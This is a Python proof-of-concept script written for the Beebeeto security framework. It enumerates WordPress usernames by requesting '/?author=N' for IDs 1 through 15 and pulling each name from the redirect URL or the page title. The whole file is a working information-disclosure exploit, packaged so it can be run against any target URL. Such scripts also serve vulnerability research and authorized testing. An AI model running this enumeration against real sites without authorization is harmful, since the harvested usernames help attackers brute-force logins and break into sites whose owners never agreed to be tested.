#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import sys
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0148',
            'name': 'Wordpress  /?author & title 用户遍历 POC',
            'author': 'Evi1m0',
            'create_date': '2014-11-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['Wordpress漏洞', 'Wordpress用户列表', 'php'],
            'desc': '''
                    [+] From: FF0000 TeAm
                    [+] Date: 20131111
                    [+] usage: python Wordpress_the_user_traversal_Poc.py  <url>
                    --------------
                    /?author=
                    /author/test/
                    author page <title>.*</title> tag.
                    ''',
            'references': ['http://www.hackersoul.com/post/wordpress_the_user_traversal_poc.html',
            ],
        },
    }

    @staticmethod
    def get_username(url):
        username = url.strip("/").rsplit('/',1)[1]
        return username


    @staticmethod
    def get_title(content):
        title = re.findall('<title>.*</title>', content)[0]
        return title[7:-8]


    @classmethod
    def get_username_from_title(cls, content):
        title = cls.get_title(content)
        username = title.split()[0]
        return username.replace('发表的所有文章','')


    @classmethod
    def verify(cls, args):
        # The default test 10
        times = 15
        url = args['options']['target']
        args['poc_ret']['user_list'] = []
        user_list = args['poc_ret']['user_list']
        if not url.startswith('http'):
            url = 'http://' + url
        if not url.endswith('/'):
            url = url + '/'
        url = url + '?author='
        for i in range(1, times+1):
            url_ = url + str(i)
            try:
                resp = requests.get(url_)
            except:
                continue
            if resp.status_code == 404:
                print 'id: %d, not found' % i
                continue
            if resp.history:
                username = cls.get_username(resp.url)
            else:
                username = cls.get_username_from_title(resp.content)
            user_list.append(username)
            print username
        if args['options']['verbose']:
            print
            print '[*] All user:'
            print '-------------'
            for name in user_list:
                print name
        args['success'] = True
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())